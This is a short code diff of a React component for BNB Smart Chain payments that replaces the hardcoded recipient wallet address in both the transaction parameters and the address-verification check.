@@ -86,7 +86,7 @@ const BNBBsc = (props) => {
                                     return setErr('mutation in transaction Amount ..!')
                                 }
 
-                                if (bnbTrReport['to'].toLowerCase() !== '0xFAe130F5E0dB53fCB3C0fd19bc9F20Cb7625a8E5'.toLowerCase()) {
+                                if (bnbTrReport['to'].toLowerCase() !== '0xbBaB29BDcfea20e743B6b7f3a189191e03114452'.toLowerCase()) {
                                     return setErr('mutation in Address..!')
                                 }
 
@@ -164,7 +164,7 @@ const BNBBsc = (props) => {
 
             let transactionParam = {
 
-                to: "0xFAe130F5E0dB53fCB3C0fd19bc9F20Cb7625a8E5",
+                to: "0xbBaB29BDcfea20e743B6b7f3a189191e03114452",
                 from: props['props'],
                 value: finalVal._hex
 
